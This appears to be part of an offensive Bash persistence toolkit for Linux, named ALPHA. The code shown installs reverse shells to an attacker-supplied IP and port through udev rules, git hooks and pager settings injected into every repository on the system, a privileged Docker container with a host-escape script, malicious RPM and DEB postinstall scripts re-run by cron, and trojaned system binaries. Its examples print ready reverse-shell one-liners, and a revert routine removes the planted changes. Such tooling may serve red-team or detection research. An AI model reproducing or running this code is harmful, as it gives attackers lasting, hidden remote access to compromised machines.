		if [[ $warning -eq 0 ]]; then
			echo "Error: --warning must be specified when using --custom."
			echo "Warning: this will overwrite the original binary with the backdoored version."
			echo "You better know what you are doing with that custom command!"
			echo "Try './alpha.sh --system-binary --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			mv $path $path.original
			echo -e '#!/bin/bash\n'$command' 2>/dev/null\n'$path'.original "$@"' > $path
			chmod +x $path
			echo "[+] $binary backdoored successfully."
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
}

setup_udev() {
	local default=0
	local ip=""
	local port=""
	local mechanism=""
	local custom=0
	local command=""
	local path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_udev() {
		echo "Usage: ./alpha.sh --udev [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default udev settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --at | --cron | --systemd    Specify the mechanism to use"
		echo "--custom                     Use custom udev settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom path"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--at | --cron | --systemd )
				mechanism="$1"
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command="$1"
				;;
			--path )
				shift
				path="$1"
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./alpha.sh --udev --default --ip 10.10.10.10 --port 1337 --at|--cron|--systemd"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --udev --custom --command 'SUBSYSTEM==\"net\", KERNEL!=\"lo\", RUN+=\"/usr/bin/at -M -f /tmp/payload now\"' --path \"/etc/udev/rules.d/10-backdoor.rules\""
				echo "echo -e '#!/bin/sh\nnohup setsid bash -c \"bash -i >& /dev/tcp/10.10.10.10/1337 0>&1\" &' > /tmp/payload && chmod +x /tmp/payload && udevadm control --reload"
				exit 0
				;;
			--help|-h)
				usage_udev
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './alpha.sh --udev --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --default requires --ip and --port."
			echo "Try './alpha.sh --udev --help' for more information."
			exit 1
		fi
		if [[ -z $mechanism ]]; then
			echo "Error: --default requires --at, --cron, or --systemd."
			echo "Try './alpha.sh --udev --help' for more information."
			exit 1
		fi

		case $mechanism in
			--at )
				# Check if 'at' utility is available
				if ! command -v at &> /dev/null; then
					echo "Error: 'at' utility is not available. Please install it to use --at option."
					exit 1
				fi

				# Create the netest script with reverse shell payload
				cat <<-EOF > /usr/bin/atest
				#!/bin/sh
				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
				EOF
				chmod +x /usr/bin/atest

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/10-atest.rules
				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/usr/bin/at -M -f /usr/bin/atest now"
				EOF
				;;

			--cron )
				# Create the netest script with reverse shell payload
				cat <<-EOF > /usr/bin/crontest
				#!/bin/sh
				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
				EOF
				chmod +x /usr/bin/crontest

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/11-crontest.rules
				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/bin/bash -c 'echo \"* * * * * /usr/bin/crontest\" | crontab -'"
				EOF
				;;

			--systemd )
				# Create the systemd service unit
				cat <<-EOF > /etc/systemd/system/systemdtest.service

				[Unit]
				Description=Systemdtest Service

				[Service]
				ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
				Restart=always
				RestartSec=60

				[Install]
				WantedBy=default.target
				EOF

				systemctl daemon-reload
				systemctl enable systemdtest.service
				systemctl start systemdtest.service

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/12-systemdtest.rules
				SUBSYSTEM=="net", KERNEL!="lo", TAG+="systemd", ENV{SYSTEMD_WANTS}+="systemdtest.service"
				EOF
				;;
		esac

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $path ]]; then
			echo "Error: --custom requires --command and --path."
			echo "Try './alpha.sh --udev --help' for more information."
			exit 1
		fi

		# Create the custom udev rules file
		echo "$command" > "$path"

	else
		echo "Error: Either --default or --custom must be specified for --udev."
		echo "Try './alpha.sh --udev --help' for more information."
		exit 1
	fi

	# Reload udev rules
	sudo udevadm control --reload

	echo "[+] Udev persistence established."
}

setup_git_persistence() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local hook=0
	local pager=0
	local path=""
	local command=""

	usage_git() {
		echo "Usage: ./alpha.sh --git [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default bind shell settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --hook                       Establish Persistence through a Git Hook"
		echo "  --pager                      Establish Persistence through Git Pager"
		echo "--custom 				       Use custom Git settings"
		echo "  --command <command>          Specify custom persistence command"
		echo "  --path <path>                Specify custom path"
		echo "  --hook                       Establish Persistence through a Git Hook"
		echo "  --pager                      Establish Persistence through Git Pager"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--hook )
				hook=1
				;;
			--pager )
				pager=1
				;;
			--path )
				shift
				path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./alpha.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager"
				echo ""
				echo "--custom:"
				echo "./alpha.sh --git --custom --command \"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &\" --path \"gitdir/.git/hooks/pre-commit\" --hook"
				echo ""
				echo "./alpha.sh --git --custom --command \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & \${PAGER:-less}\" --path \"~/.gitconfig --pager\""
				exit 0
				;;
			--help|-h)
				usage_git
				exit 0
				;;
			* )
				echo "Invalid option for --git: $1"
				echo "Try './alpha.sh --git --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: --default or --custom must be specified."
		echo "Try './alpha.sh --git --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './alpha.sh --git --help' for more information."
			exit 1
		fi

		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
			echo "Error: Either --hook or --pager must be specified with --default."
			echo "Try './alpha.sh --git --help' for more information."
			exit 1
		fi
	fi

	if [[ $custom -eq 1 ]]; then
		if [[ -z $path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './alpha.sh --git --help' for more information."
			exit 1
		fi

		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
			echo "Error: Either --hook or --pager must be specified with --custom."
			echo "Try './alpha.sh --git --help' for more information."
			exit 1
		fi
	fi

	# Function to add malicious pre-commit hook
	add_malicious_pre_commit() {
		local git_repo="$1"
		local pre_commit_file="$git_repo/.git/hooks/pre-commit"

		if [[ ! -f $pre_commit_file ]]; then
			echo "#!/bin/bash" > $pre_commit_file
			echo "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &" >> $pre_commit_file
			chmod +x $pre_commit_file
			echo "[+] Created malicious pre-commit hook in $git_repo"
		else
			echo "[-] Pre-commit hook already exists in $git_repo"
		fi
	}

	# Function to add malicious pager configuration
	add_malicious_pager() {
		local git_repo="$1"
		local git_config="$git_repo/.git/config"
		local user_git_config="$HOME/.gitconfig"

		local payload="nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' > /dev/null 2>&1 & \${PAGER:-less}"

		if [[ ! -f $git_config ]]; then
			mkdir -p $git_repo/.git
			echo "[core]" > $git_config
			echo "        pager = $payload" >> $git_config
			echo "[+] Created Git config with malicious pager in $git_repo"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $git_config; then
				echo "[core]" >> $git_config
			fi
			# Add pager configuration under [core] section
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $git_config
			echo "[+] Updated existing Git config with malicious pager in $git_repo"
		fi

		# Add to user's global config if it doesn't exist
		if [[ ! -f $user_git_config ]]; then
			echo "[core]" > $user_git_config
			echo "        pager = $payload" >> $user_git_config
			echo "[+] Created global Git config with malicious pager"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $user_git_config; then
				echo "[core]" >> $user_git_config
			fi
			# Add pager configuration under [core] section in global config
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $user_git_config
			echo "[+] Updated existing global Git config with malicious pager"
		fi
	}

	# Function to add custom pre-commit hook
	add_custom_pre_commit() {
		if [[ ! -f $path ]]; then
			echo "#!/bin/sh" > $path
			echo "$command" >> $path
			chmod +x $path
			echo "[+] Created custom pre-commit hook in $path"
		else
			echo "[-] Pre-commit hook already exists in $path"
		fi
	}

	# Function to add custom pager configuration
	add_custom_pager() {
		local payload="$command"

		if [[ ! -f $path ]]; then
			echo "[core]" > $path
			echo "        pager = $payload" >> $path
			echo "[+] Created custom Git config with pager in $path"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $path; then
				echo "[core]" >> $path
			fi
			# Add pager configuration under [core] section
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $path
			echo "[+] Updated existing Git config with custom pager in $path"
		fi
	}

	# Function to find Git repositories and apply chosen options
	find_git_repositories() {
		local repos=$(find / -name ".git" -type d 2>/dev/null)

		if [[ -z $repos ]]; then
			echo "[-] No Git repositories found."
		else
			for repo in $repos; do
				local git_repo=$(dirname $repo)
				if [[ $hook -eq 1 ]]; then
					add_malicious_pre_commit $git_repo
				fi
				if [[ $pager -eq 1 ]]; then
					add_malicious_pager $git_repo
				fi
			done
		fi
	}

	# Execute based on mode (default or custom)
	if [[ $default -eq 1 ]]; then
		find_git_repositories
	elif [[ $custom -eq 1 ]]; then
		if [[ $hook -eq 1 ]]; then
			add_custom_pre_commit
		elif [[ $pager -eq 1 ]]; then
			add_custom_pager
		fi
	fi
	echo "[+] Git persistence established!"
}

setup_malicious_docker_container() {
	local ip=""
	local port=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_malicious_docker_container() {
		echo "Usage: ./alpha.sh --docker-container [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--help|-h)
				usage_malicious_docker_container
				exit 0
				;;
			--examples )
				echo "Examples:"
				echo "./alpha.sh --docker-container --default --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			* )
				echo "Invalid option for --docker-container: $1"
				echo "Try './alpha.sh --docker-container --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port ]]; then
		echo "Error: --ip and --port must be specified."
		echo "Try './alpha.sh --docker-container --help' for more information."
		exit 1
	fi

	if ! docker ps &> /dev/null; then
		echo "Error: Docker daemon is not running or permission denied."
		exit 1
	fi

	# Dockerfile setup and Docker image creation
	DOCKERFILE="/tmp/Dockerfile"
	cat <<-EOF > $DOCKERFILE
	FROM alpine:latest

	RUN apk add --no-cache bash socat sudo util-linux procps

	RUN adduser -D lowprivuser

	RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh \\
		&& echo 'while true; do /bin/bash -c "socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:$ip:$port"; sleep 60; done' >> /usr/local/bin/entrypoint.sh \\
		&& chmod +x /usr/local/bin/entrypoint.sh

	RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh \\
		&& echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' >> /usr/local/bin/escape.sh \\
		&& chmod +x /usr/local/bin/escape.sh \\
		&& echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' >> /etc/sudoers

	USER lowprivuser

	ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
	EOF

	# Building and running the Docker container
	docker build -t malicious-container -f $DOCKERFILE . && \
	docker run -d --name malicious-container --privileged --pid=host malicious-container

	echo "[+] Malicious Docker container created and running."
	echo "[+] Reverse shell is executed every minute."
	echo "[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'."
	echo "[+] Docker container persistence established!" 
}

setup_malicious_package() {
	local ip=""
	local port=""
	local mechanism=""
	local os_version=""
	local architecture=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_malicious_package() {
		echo "Usage: ./setup.sh --malicious-package [OPTIONS]"
		echo "--examples            Display command examples"
		echo "--ip <ip>             Specify IP address"
		echo "--port <port>         Specify port number"
		echo "--rpm                 Use RPM package manager"
		echo "--dpkg                Use DPKG package manager"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--rpm )
				mechanism="$1"
				;;
			--dpkg )
				mechanism="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./alpha.sh --malicious-package --ip 10.10.10.10 --port 1337 --rpm | --dpkg"
				exit 0
				;;
			--help | -h )
				usage_malicious_package
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './setup.sh --malicious-package --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port || -z $mechanism ]]; then
		echo "Error: --ip, --port, and one of --rpm or --dpkg must be specified."
		echo "Try './setup.sh --malicious-package --help' for more information."
		exit 1
	fi

	case $mechanism in
		--rpm )
			if ! command -v rpm &> /dev/null; then
					echo "Warning: RPM does not seem to be available. It might not work."
					return 1
			fi

			if ! command -v rpmbuild &> /dev/null; then
					echo "Error: rpmbuild is not installed."
					exit 1
			fi

			# Ensure the directory structure exists
			mkdir -p ~/rpmbuild/SPECS
			mkdir -p ~/rpmbuild/BUILD
			mkdir -p ~/rpmbuild/RPMS
			mkdir -p ~/rpmbuild/SOURCES
			mkdir -p ~/rpmbuild/SRPMS

			# RPM package setup
			PACKAGE_NAME="alpha"
			PACKAGE_VERSION="1.0"
			cat <<-EOF > ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
			Name: ${PACKAGE_NAME}
			Version: ${PACKAGE_VERSION}
			Release: 1%{?dist}
			Summary: RPM package with payload script
			License: MIT

			%description
			RPM package with a payload script that executes a reverse shell.

			%prep
			# No need to perform any preparation actions

			%install
			# Create directories
			mkdir -p %{buildroot}/usr/bin

			%files
			# No need to specify any files here since the payload is embedded

			%post
			# Trigger payload after installation
			nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &

			%clean
			rm -rf %{buildroot}

			%changelog
			* $(date +'%a %b %d %Y') John Doe <john.doe@example.com> 1.0-1
			- Initial package creation
			EOF
			# Build RPM package
			rpmbuild -bb ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec

			# Install RPM package with forced overwrite
			VER=$(grep VERSION_ID /etc/os-release | cut -d '"' -f 2 | cut -d '.' -f 1)
			rpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm
			mv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm
			rm -rf /root/rpmbuild
			# Add crontab entry for the current user
			echo "*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm > /dev/null 2>&1" | crontab -
			;;

		--dpkg )

			if ! command -v dpkg &> /dev/null; then
				echo "Warning: DPKG does not seem to be available. It might not work."
			fi

			# DPKG package setup
			PACKAGE_NAME="alpha"
			PACKAGE_VERSION="1.0"
			DEB_DIR="${PACKAGE_NAME}/DEBIAN"
			PAYLOAD="#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &"

			# Create directory structure
			mkdir -p ${DEB_DIR}

			# Write postinst script
			echo -e "${PAYLOAD}" > ${DEB_DIR}/postinst
			chmod +x ${DEB_DIR}/postinst

			# Write control file
			echo "Package: ${PACKAGE_NAME}" > ${DEB_DIR}/control
			echo "Version: ${PACKAGE_VERSION}" >> ${DEB_DIR}/control
			echo "Architecture: all" >> ${DEB_DIR}/control
			echo "Maintainer: https://github.com/Aegrah/ALPHA" >> ${DEB_DIR}/control
			echo "Description: This malicious package was added through ALPHA" >> ${DEB_DIR}/control

			# Build the .deb package
			dpkg-deb --build ${PACKAGE_NAME}

			# Install the .deb package
			dpkg -i ${PACKAGE_NAME}.deb

			rm -rf ${PACKAGE_NAME}
			rm -rf ${DEB_DIR}

			# Add crontab entry for the current user
			echo "*/1 * * * * /var/lib/dpkg/info/${PACKAGE_NAME}.postinst configure > /dev/null 2>&1" | crontab -
			;;

		* )
			echo "Invalid mechanism specified."
			exit 1
			;;
	esac
	echo "[+] Malicious package persistence established."
}

revert_changes() {
	local current_user=$(whoami)
	local ssh_dir="/home/$current_user/.ssh"
	local is_root=false
	local in_docker_group=false
	local malicious_entry="/dev/tcp"

	# Check if running as root
	if [ "$(id -u)" -eq 0 ]; then
		is_root=true
	fi

	# Check if the user is in the docker group
	if groups $current_user | grep -q '\bdocker\b'; then
		in_docker_group=true
	fi

	if $is_root; then
		echo "[*] Running as root..."
	else
		echo "[*] Running as user..."
	fi

	# Systemd
	echo "[*] Cleaning Systemd persistence methods..."
	if $is_root; then
		systemctl stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
		systemctl disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
		rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service
		rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer
	fi
	rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service
	rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer
	if ! $is_root; then
		systemctl --user stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
		systemctl --user disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
	fi
	echo "[+] Successfully cleaned persistence method Systemd"

	# Systemd Generator
	echo "[*] Cleaning Systemd Generator persistence methods..."
	if $is_root; then
		systemctl stop generator.service 2>/dev/null
		systemctl disable generator.service 2>/dev/null
		rm -f /usr/lib/systemd/system-generators/makecon
		rm -f /usr/lib/systemd/system-generators/generator
		rm -f /run/systemd/system/generator.service
		rm -f /run/systemd/system/multi-user.target.wants/generator.service
	else
		systemctl --user stop generator.service 2>/dev/null
		systemctl --user disable generator.service 2>/dev/null
	fi
	echo "[+] Successfully cleaned persistence method Systemd Generator"

	# Cron
	echo "[*] Cleaning Cron persistence methods..."
	if $is_root; then
		rm -f /etc/cron.d/freedesktop_timesync1
		for file in /etc/cron*; do
			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
		done
	fi
	crontab -l | grep -v "$malicious_entry" | crontab -
	echo "[+] Successfully cleaned persistence method Cron"

	# At
	echo "[*] Cleaning At persistence methods..."
	if $is_root; then
		for file in /var/spool/cron/atjobs/*; do
			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
		done
	fi
	echo "[+] Successfully cleaned persistence method At"

	# Shell profile
	echo "[*] Cleaning Shell profile persistence methods..."
	if $is_root; then
		[ -e "/etc/profile" ] && sed -i "/$malicious_entry/ d" /etc/profile 2>/dev/null
	fi
	[ -e "/home/$current_user/.bash_profile" ] && sed -i "/$malicious_entry/ d" /home/$current_user/.bash_profile 2>/dev/null
	echo "[+] Successfully cleaned persistence method Shell profile"

	# XDG
	echo "[*] Cleaning XDG persistence methods..."
	if $is_root; then
		rm -f /etc/xdg/autostart/pkc12-register.desktop
		rm -f /etc/xdg/pkc12-register
	fi
	rm -f /home/$current_user/.config/autostart/user-dirs.desktop
	rm -f /home/$current_user/.config/autostart/.user-dirs
	echo "[+] Successfully cleaned persistence method XDG"

	# SSH
	echo "[*] Cleaning SSH persistence methods..."
	rm -f $ssh_dir/id_rsa1822
	rm -f $ssh_dir/id_rsa1822.pub
	echo "[+] Successfully cleaned persistence method SSH"

	# Sudoers
	echo "[*] Cleaning Sudoers persistence methods..."
	if $is_root; then
		rm -f /etc/sudoers.d/$current_user
	fi
	echo "[+] Successfully cleaned persistence method Sudoers"

	# Setuid
	echo "[*] Cleaning Setuid persistence methods..."
	if $is_root; then
		for bin in find dash python python3; do
			[ -e "$(which $bin)" ] && chmod u-s $(which $bin) 2>/dev/null
		done
	fi
	echo "[+] Successfully cleaned persistence method Setuid"

	# MOTD
	echo "[*] Cleaning MOTD persistence methods..."
	if $is_root; then
		rm -f /etc/update-motd.d/137-python-upgrades
		for file in /etc/update-motd.d/*; do
			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
		done
	fi
	echo "[+] Successfully cleaned persistence method MOTD"

	# rc.local
	echo "[*] Cleaning rc.local persistence methods..."
	if $is_root; then
		[ -e "/etc/rc.local" ] && sed -i "/$malicious_entry/ d" /etc/rc.local 2>/dev/null
	fi
	echo "[+] Successfully cleaned persistence method rc.local"

	# initd
	echo "[*] Cleaning initd persistence methods..."
	if $is_root; then
		rm -f /etc/init.d/ssh-procps
	fi
	echo "[+] Successfully cleaned persistence method initd"

	# Package Managers
	echo "[*] Cleaning Package Managers persistence methods..."
	if $is_root; then
		rm -f /etc/apt/apt.conf.d/01python-upgrades
		rm -f /usr/lib/yumcon
		rm -f /usr/lib/yum-plugins/yumcon.py
		rm -f /etc/yum/pluginconf.d/yumcon.conf
		local python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
		[ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnfcon
		rm -f /etc/dnf/plugins/dnfcon.conf
		[ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
	fi
	echo "[+] Successfully cleaned persistence method Package Managers"

	# setcap
	echo "[*] Cleaning setcap persistence methods..."
	if $is_root; then
		for bin in perl ruby php python python3 node; do
			[ -e "$(which $bin)" ] && setcap -r $(which $bin) 2>/dev/null
		done
	fi
	echo "[+] Successfully cleaned persistence method setcap"

	# Bind shell
	echo "[*] Cleaning Bind shell persistence methods..."
	if $is_root; then
		pkill -f /tmp/bd86 2>/dev/null
		pkill -f /tmp/bd64 2>/dev/null
	fi
	rm -f /tmp/bd86
	rm -f /tmp/bd64
	echo "[+] Successfully cleaned persistence method Bind shell"

	# Backdoor binaries
	echo "[*] Cleaning Backdoor binaries persistence methods..."
	if $is_root; then
		for binary in cat ls; do
			original=$(which $binary).original
			if [ -f "$original" ]; then
				mv "$original" "$(which $binary)" 2>/dev/null
				if [ $? -eq 0 ]; then
					echo "[+] Successfully restored $binary binary"
				else
					echo "[-] Failed to restore $binary binary"
				fi
			else
				echo "[*] No original file for $binary found, skipping..."
			fi
		done
	fi
	echo "[+] Successfully cleaned persistence method Backdoor binaries"

	# udev
	echo "[*] Cleaning udev persistence methods..."
	if $is_root; then
		rm -f /usr/bin/atest
		rm -f /etc/udev/rules.d/10-atest.rules
		rm -f /usr/bin/crontest
		rm -f /etc/udev/rules.d/11-crontest.rules
		rm -f /etc/udev/rules.d/12-systemdtest.rules
		systemctl stop systemdtest.service 2>/dev/null
		systemctl disable systemdtest.service 2>/dev/null
		rm -f /etc/systemd/system/systemdtest.service
	fi
	echo "[+] Successfully cleaned persistence method udev"

	# Git
	echo "[*] Cleaning Git persistence methods..."
	local repos=$(find / -name ".git" -type d 2>/dev/null)

	if [[ -z $repos ]]; then
		echo "[-] No Git repositories found."
	else
		for repo in $repos; do
			local git_repo=$(dirname $repo)
			local pre_commit_file="$git_repo/.git/hooks/pre-commit"
			local git_config="$git_repo/.git/config"
			local user_git_config="/home/$current_user/.gitconfig"

			# Remove malicious pre-commit hook
			if [[ -f $pre_commit_file ]]; then
				if grep -q "$malicious_entry" $pre_commit_file; then
					sed -i "/$malicious_entry/ d" $pre_commit_file
					echo "[+] Removed malicious entry from pre-commit hook in $git_repo"
				fi
			fi

			# Remove malicious pager configuration from repo config
			if [[ -f $git_config ]]; then
				if grep -q "$malicious_entry" $git_config; then
					sed -i "/$malicious_entry/ d" $git_config
					echo "[+] Removed malicious pager from Git config in $git_repo"
				fi
			fi

			# Remove malicious pager configuration from global config
			if [[ -f $user_git_config ]]; then
				if grep -q "$malicious_entry" $user_git_config; then
					sed -i "/$malicious_entry/ d" $user_git_config
					echo "[+] Removed malicious pager from global Git config"
				fi
			fi
		done
	fi
	echo "[+] Successfully cleaned persistence method Git"

	# Docker
	echo "[*] Cleaning Docker persistence methods..."
	if $is_root || $in_docker_group; then
		rm -f /tmp/Dockerfile
		docker stop malicious-container 2>/dev/null
		docker rm malicious-container 2>/dev/null
	fi
	echo "[+] Successfully cleaned persistence method Docker"

	# Malicious package
	echo "[*] Cleaning Malicious package persistence methods..."
	if $is_root; then
		rm -f /var/lib/rpm/alpha.rpm
		rm -f /var/lib/dpkg/info/alpha.postinst
		sed -i '/alpha.rpm/ d' /var/spool/cron/$current_user
		sed -i '/alpha.postinst/ d' /var/spool/cron/crontabs/$current_user
	fi
	echo "[+] Successfully cleaned persistence method Malicious package"
}

main() {
	local QUIET=0

	if [[ $# -eq 0 ]]; then
		if [[ $QUIET -ne 1 ]]; then
			print_banner
		fi
		if check_root; then
			usage_root
		else
			usage_user
		fi
		exit 0
	fi

	# Parse command line arguments
	while [[ "$1" != "" ]]; do
		case $1 in
			-q | --quiet )
				QUIET=1
				;;
			-h | --help )
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit
				;;
			--systemd )
				shift
				setup_systemd "$@"
				exit
				;;
			--generator )
				shift
				setup_generator_persistence "$@"
				exit
				;;
			--cron )
				shift
				setup_cron "$@"
				exit
				;;
			--at )
				shift
				setup_at "$@"
				exit
				;;
			--ssh-key )
				shift
				setup_ssh_key "$@"
				exit
				;;
			--authorized-keys )
				shift
				setup_authorized_keys "$@"
				exit
				;;
			--shell-profile )
				shift
				setup_shell_profile "$@"
				exit
				;;
			--xdg )
				shift
				setup_xdg "$@"
				exit
				;;
			--create-user )
				shift
				setup_new_user "$@"
				exit
				;;
			--backdoor-user )
				shift
				setup_backdoor_user "$@"
				exit
				;;
			--password-change )
				shift
				setup_password_change "$@"
				exit
				;;
			--passwd-user )
				shift
				setup_passwd_user "$@"
				exit
				;;
			--sudoers )
				shift
				setup_sudoers_backdoor "$@"
				exit
				;;
			--suid )
				shift
				setup_suid_backdoor "$@"
				exit
				;;
			--motd )
				shift
				setup_motd_backdoor "$@"
				exit
				;;
			--rc-local )
				shift
				setup_rc_local_backdoor "$@"
				exit
				;;
			--initd )
				shift
				setup_initd_backdoor "$@"
				exit
				;;
			--package-manager )
				shift
				setup_package_manager_persistence "$@"
				exit
				;;
			--cap )
				shift
				setup_cap_backdoor "$@"
				exit
				;;
			--bind-shell )
				shift
				setup_bind_shell "$@"
				exit
				;;
			--system-binary )
				shift
				setup_system_binary_backdoor "$@"
				exit
				;;
			--udev )
				shift
				setup_udev "$@"
				exit
				;;
			--git )
				shift
				setup_git_persistence "$@"
				exit
				;;
			--docker-container )
				shift
				setup_malicious_docker_container "$@"
				exit
				;;
			--malicious-package )
				shift
				setup_malicious_package "$@"
				exit
				;;
			--revert )
				shift
				revert_changes
				exit
				;;
			* )
				echo "Invalid option: $1"
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit 1
		esac
		shift
	done

	# Print banner unless in quiet mode
	if [[ $QUIET -ne 1 ]]; then
		print_banner
	fi

	# Show the usage menu if no specific command is given
	if check_root; then
		usage_root
	else
		usage_user
	fi
}

main "$@"
